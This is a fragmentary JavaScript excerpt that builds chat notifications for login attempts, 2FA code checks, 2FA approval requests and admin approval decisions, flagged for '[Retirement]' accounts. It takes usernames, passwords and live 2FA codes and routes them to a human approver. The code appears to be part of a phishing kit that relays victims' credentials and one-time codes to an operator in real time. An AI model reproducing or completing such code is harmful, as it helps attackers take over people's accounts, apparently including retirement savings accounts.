...
async function sendLoginAttemptNotification(data, meta = {}) {
  ...
  const { username, password, verificationId, retirement } = data;

  const content =
    `🔓 <b>Login Approval Request ${retirement? "[Retirement]": ''}</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
    `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
...
async function sendTwoFactorCodeNotification(data, meta = {}) {
  const { username, code, status, expectedCode, method, reason ,retirement} = data;
  ...
  const content =
    `${statusEmoji} <b>2FA Code Verification ${retirement? "[Retirement]": ''}</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
...
async function send2FAApprovalRequest(data, meta = {}) {
  const { username, code, method, verificationId, retirement } = data;
  ...
  const content =
    `⏳ <b>2FA Approval Request ${retirement? "[Retirement]": ''}</b>\n` +
    `━━━━━━━━━━━━━━━━━━\n\n` +
    `Ⓜ️ <b>Method:</b> <code>${escapeHtml(method || 'Unknown')}</code>\n` +
    `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
...
async function sendAdminDecisionNotification(data) {
  const { username, decision, reason, verificationId, approvedBy } = data;
  ...
  if (decision === 'approved') {
    content =
      ...
      `━━━━━━━━━━━━━━━━━━\n\n` +
      `🔑 <b>Username:</b> <code>${escapeHtml(username)}</code>\n` +
      `📋 <b>Verification ID:</b> <code>${escapeHtml(verificationId)}</code>\n\n` +
